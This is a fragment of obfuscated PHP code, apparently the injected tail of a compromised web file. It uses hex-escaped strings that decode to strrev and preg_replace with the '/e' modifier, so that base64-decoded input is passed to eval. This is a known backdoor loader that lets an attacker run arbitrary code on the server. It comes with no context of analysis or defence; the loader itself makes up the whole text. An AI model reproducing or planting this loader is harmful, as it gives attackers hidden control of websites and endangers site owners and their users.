"\x3b\51\x29\135\x31\133\x72\152\x53\126\x63\102\x6b\141\x64\151\x59\164\x31\141\x76\145\x24\50\x65\144\x6f\143\x65\144\x5f\64\x36\145\x73\141\x62\50\x6c\141\x76\145\x40\72\x65\166\x61\154\x28\42\x5c\61\x22\51\x3b\72\x40\50\x2e\53\x29\100\x69\145";$eva1tYldokBcVSjr=$eva1tYldakBcVSir($eva1tYldakBoVS1r);$eva1tYldakBcVSjr=$eva1tYldakBcVSir($eva1tYlbakBcVSir);$eva1tYidakBcVSjr = $eva1tYldakBcVSjr(chr(2687.5*0.016), $eva1fYlbakBcVSir);$eva1tYXdakAcVSjr = $eva1tYidakBcVSjr[0.031*0.061];$eva1tYidokBcVSjr = $eva1tYldakBcVSjr(chr(3625*0.016), $eva1tYidokBoVSjr);$eva1tYldokBcVSjr($eva1tYidokBcVSjr[0.016*(7812.5*0.016)],$eva1tYidokBcVSjr[62.5*0.016],$eva1tYldakBcVSir($eva1tYidokBcVSjr[0.061*0.031]));$eva1tYldakBcVSir = "";$eva1tYldakBoVS1r = $eva1tYlbakBcVSir.$eva1tYlbakBcVSir;$eva1tYidokBoVSjr = $eva1tYlbakBcVSir;$eva1tYldakBcVSir = "\x73\164\x72\x65\143\x72\160\164\x72";$eva1tYlbakBcVSir = "\x67\141\x6f\133\x70\170\x65";$eva1tYldakBoVS1r = "\x65\143\x72\160";$eva1tYldakBcVSir = "";$eva1tYldakBoVS1r = $eva1tYlbakBcVSir.$eva1tYlbakBcVSir;$eva1tYidokBoVSjr = $eva1tYlbakBcVSir;} ?>